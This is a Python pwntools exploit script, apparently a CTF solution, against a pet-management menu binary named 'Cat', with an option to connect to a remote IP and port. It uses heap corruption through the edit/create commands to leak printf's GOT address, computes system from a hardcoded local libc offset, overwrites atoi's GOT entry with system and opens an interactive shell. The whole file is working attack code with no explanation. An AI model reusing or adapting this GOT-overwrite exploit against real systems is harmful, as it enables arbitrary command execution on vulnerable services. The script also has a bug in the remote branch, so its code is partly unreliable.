from pwn import *
import sys

def create(name, kind, age):
    p.sendafter("which command?\n> ", "0001")
    p.sendafter("What's the pet's name?\n> ", name)
    p.sendafter("What's the pet's kind?\n> ", kind)
    p.sendafter("How old?\n> ", str(age).rjust(4,"0"))

def edit(idx, name, kind, age, yn):
    p.sendafter("which command?\n> ", "0002")
    p.sendafter("which id?\n> ", str(idx).rjust(4,"0"))
    p.sendafter("What's the pet's name?\n> ", name)
    p.sendafter("What's the pet's kind?\n> ", kind)
    p.sendafter("How old?\n> ", str(age).rjust(4,"0"))
    p.sendafter("Would you modify? (y)/n> ", yn.ljust(4,"\x00"))

def print_one(idx):
    global pname, pkind, pold
    p.sendafter("which command?\n> ", "0003")
    p.sendafter("which id?\n> ", str(idx).rjust(4,"0"))
    p.recvuntil("name: ")
    pname = p.recvline()[:-1]
    p.recvuntil("kind: ")
    pkind = p.recvline()[:-1]
    p.recvuntil("old: ")
    pold = p.recvline()[:-1]


def print_all():
    p.sendafter("which command?\n> ", "0004")
    print p.recvuntil("print all: \n")

def delete_one(idx):
    p.sendafter("which command?\n> ", "0005")
    p.sendafter("which id?\n> ", str(idx).rjust(4,"0"))


if len(sys.argv) == 1:
    p = process("./Cat")
else:
    remote("178.62.40.102", 6000)

atoi_got = 0x602068
printf_got = 0x602038
pet_list = 0x6020A0


# round 1. leak printf address
create("0000","0000","0")
edit(0, "aaaa","aaaa","aaaa","n")

to_write = pet_list
payload = p64(to_write) * 2 + "a" 
create("1111", payload, "1")
create("2222", "2222", "2")
create("3333", "3333", "3")
edit(3, p64(pet_list),p64(printf_got-16),"4", "y")
print_one(0)
printf = int(pold)
log.info("printf = 0x%x" % printf)
create("4444","4444","4")

# round 2. leak atoi address
"""
create("5555","5555","5")
edit(4, "aaaa","aaaa","aaaa","n")

to_write = pet_list
payload = p64(to_write) * 2 + "a"
create("6666", payload, "1")
create("7777", "2222", "2")
create("8888", "3333", "3")
edit(1, p64(pet_list),p64(atoi_got-16),"4", "y")
print_one(0)
atoi = int(pold)
log.info("atoi = 0x%x" % atoi)
"""

# round 3. using libc database, we can get offset of system.
# overwrite the atoi with system
system = printf	- 0x10470	# it is my local offset.
log.info("system : 0x%x" % system)
create("5555","5555","5")
edit(4, "aaaa","aaaa","aaaa","n")

to_write = atoi_got
payload = p64(to_write) * 2 + "a"
create("6666", payload, "1")
create("7777", "2222", "2")
create("8888", "3333", "3")
edit(8, p64(pet_list),p64(system),"4", "y")

p.interactive()
